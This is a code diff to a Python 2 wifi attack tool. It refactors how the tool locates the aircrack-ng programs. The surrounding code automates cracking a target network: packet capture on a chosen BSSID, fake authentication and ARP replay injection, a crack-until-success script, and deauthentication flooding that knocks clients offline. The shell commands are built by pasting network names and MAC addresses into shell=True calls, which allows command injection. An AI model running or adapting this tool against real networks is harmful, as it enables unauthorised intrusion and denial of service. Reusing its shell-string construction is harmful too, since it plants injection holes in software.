@@ -7,7 +7,7 @@ from inspect import isfunction, ismethod
 from subprocess import Popen,PIPE,call
 
 import grooconfig
-from grooconfig import groo_root,airtools_root
+from grooconfig import groo_root,aircrack,airodump,aireplay
 from grooserv import model
 from pywifi import pywifi_scan,pywifi_parseClient  
 
@@ -253,19 +253,19 @@ class MenuApp:
         call('rm -f '+dumpdir+'/dump*', shell=True)      
         call('rm -f '+dumpdir+'/replay*', shell=True)
         print 'Resetting to channel '+channel
-        call(groo_root+'scripts/config_ath.sh '+channel, shell=True)
+        call(groo_root+'scripts/config_ath.sh '+channel+' '+ath, shell=True)
         
-        dumpcmd = 'cd '+dumpdir+';'+airtools_root+'airodump-ng -c '+channel+' -b '+bssid+' -w dump '+ath
+        dumpcmd = 'cd '+dumpdir+';'+airodump+' -c '+channel+' -b '+bssid+' -w dump '+ath
         self.detachNewScreen('dump', dumpcmd)
 
-        authcmd = 'cd '+dumpdir+';'+airtools_root+'aireplay-ng -1 0 -e '+essid+' -a '+bssid+' -h '+mac+' '+ath+';'+\
+        authcmd = 'cd '+dumpdir+';'+aireplay+' -1 0 -e '+essid+' -a '+bssid+' -h '+mac+' '+ath+';'+\
              'sleep 5;'+\
-             airtools_root+'aireplay-ng -3 -b '+bssid+' -h '+mac+' '+ath
+             aireplay+' -3 -b '+bssid+' -h '+mac+' '+ath
         self.detachNewScreen('auth', authcmd)
 
         crackcmd = 'sleep 5;'+\
              groo_root+'scripts/crack_until_it_works.sh '+\
-             essid+' '+bssid+' '+groo_root+' '+airtools_root+ ';read x'
+             essid+' '+bssid+' '+groo_root+' '+aircrack+';read x'
         self.detachNewScreen('crack', crackcmd)
         
 
@@ -281,9 +281,9 @@ class MenuApp:
         print 'Deauth Flooding...'
         clientmac = pywifi_parseClient( essid, grooconfig.dumpDirectory+'/dump-01.txt' )
         if clientmac:
-            call(airtools_root+'aireplay-ng -0 5 -a '+bssid+' -c '+clientmac+' '+ath, shell=True)
+            call(aireplay+' -0 5 -a '+bssid+' -c '+clientmac+' '+ath, shell=True)
         else:    
-            call(airtools_root+'aireplay-ng -0 5 -a '+bssid+' '+ath, shell=True)
+            call(aireplay+' -0 5 -a '+bssid+' '+ath, shell=True)
 
     def rescan( self, key ):
         print 'Scanning...'
